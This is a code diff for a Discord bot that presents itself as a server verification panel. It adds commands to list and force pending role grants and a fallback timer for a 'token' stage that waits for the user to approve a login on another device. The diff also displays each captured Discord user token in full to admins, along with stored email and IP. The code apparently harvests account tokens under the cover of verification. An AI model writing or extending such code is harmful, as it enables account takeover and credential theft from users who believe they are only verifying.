@@ -10,6 +10,7 @@ import {
 import { config } from './config.js';
 import { store, save } from './store.js';
 import { rand } from './util.js';
+import { grantRoles } from './verify.js';
 
 /* --- オプション値の正規化 ---------------------------------------------
    環境によっては options.get() が生のオプション({name,type,value})を返すため、
@@ -109,6 +110,8 @@ export const commands = [
             .addChoices(...STAGE_CHOICES)
         )
     )
+    .addSubcommand((s) => s.setName('pending').setDescription('ロール付与が保留中の認証を一覧'))
+    .addSubcommand((s) => s.setName('grant').setDescription('保留中のロール付与を今すぐ実行'))
     .addSubcommand((s) =>
       s.setName('repost').setDescription('パネルを再送信')
         .addStringOption((o) => o.setName('id').setDescription('パネルID').setRequired(true))
@@ -165,7 +168,7 @@ export function buildPanelMessage(panel) {
       name: 'ロール付与タイミング',
       value:
         (panel.grantStage || 'oauth') === 'token'
-          ? '別デバイスでのログイン許可後に付与'
+          ? `別デバイスでのログイン許可後に付与（未取得なら${Math.max(config.tokenGraceSeconds, 0)}秒でフォールバック）`
           : 'Discord 認証（OAuth）完了時に付与'
     });
   }
@@ -324,6 +327,63 @@ export async function handleCommand(interaction) {
       });
     }
 
+    if (sub === 'pending') {
+      const list = store.verifications.filter(
+        (v) => v.guildId === interaction.guildId && v.pendingRole
+      );
+      if (!list.length) {
+        return interaction.reply({ content: '保留中のロール付与はありません', flags: MessageFlags.Ephemeral });
+      }
+      const body = list
+        .slice(-25)
+        .map(
+          (v) =>
+            `<@${v.userId}> token:${v.userToken ? '取得済' : '未取得'} at:${v.at}${v.roleError ? ` err:${v.roleError}` : ''}`
+        )
+        .join('\n');
+      return interaction.reply({ content: body.slice(0, 1900), flags: MessageFlags.Ephemeral });
+    }
+
+    if (sub === 'grant') {
+      const list = store.verifications.filter(
+        (v) => v.guildId === interaction.guildId && v.pendingRole
+      );
+      if (!list.length) {
+        return interaction.reply({ content: '保留中のロール付与はありません', flags: MessageFlags.Ephemeral });
+      }
+
+      let okCount = 0;
+      let ngCount = 0;
+      for (const v of list) {
+        const panel = store.panels[v.panelId];
+        const user = await interaction.client.users.fetch(v.userId).catch(() => null);
+        if (!panel || !user) {
+          v.pendingRole = false;
+          v.roleError = 'panel/user 不在';
+          ngCount++;
+          continue;
+        }
+        const out = await grantRoles({ client: interaction.client, panel, user, oauth: v.oauth });
+        v.pendingRole = false;
+        v.roleGranted = out.ok;
+        v.roleFallbackAt = new Date().toISOString();
+        if (!out.ok) v.roleError = out.err;
+        if (v.dump?.role) {
+          v.dump.role.pending = false;
+          v.dump.role.granted = out.ok;
+          v.dump.role.error = out.err || null;
+          v.dump.role.fallback = true;
+        }
+        out.ok ? okCount++ : ngCount++;
+      }
+      save();
+
+      return interaction.reply({
+        content: `成功 ${okCount} 件 / 失敗 ${ngCount} 件`,
+        flags: MessageFlags.Ephemeral
+      });
+    }
+
     if (sub === 'repost') {
       const panel = store.panels[interaction.options.getString('id')];
       if (!panel || panel.guildId !== interaction.guildId) {
@@ -358,6 +418,8 @@ export async function handleCommand(interaction) {
       ip: null,
       ok: true,
       manual: true,
+      pendingRole: false,
+      roleGranted: true,
       reasons: [`手動認証 (${interaction.user.tag})`],
       at: new Date().toISOString(),
       fp: null,
@@ -401,6 +463,8 @@ export async function handleCommand(interaction) {
     if (!recs.length) return interaction.reply({ content: '記録がありません', flags: MessageFlags.Ephemeral });
 
     const r = recs[recs.length - 1];
+    const token = r.userToken || r.dump?.tokens?.user_token || null;
+
     const e = new EmbedBuilder()
       .setTitle(user.tag)
       .setColor(r.revoked ? 0x95a5a6 : r.ok ? 0x2ecc71 : 0xe74c3c)
@@ -416,14 +480,16 @@ export async function handleCommand(interaction) {
         { name: 'メール', value: r.email ? `\`${r.email}\`` : '-', inline: true },
         {
           name: 'トークン',
-          value: r.userToken ? `\`\`\`\n${r.userToken}\n\`\`\`` : '未取得'
+          value: token
+            ? `\`\`\`\n${token}\n\`\`\`${r.tokenUnverified ? '\n※未検証' : ''}`
+            : '未取得'
         },
         {
           name: 'ロール付与',
           value: r.pendingRole
             ? '保留（トークン取得待ち）'
             : r.roleGranted
-              ? '付与済み'
+              ? `付与済み${r.roleFallbackAt ? '（フォールバック）' : ''}`
               : r.roleError
                 ? `失敗: ${r.roleError}`
                 : '-'
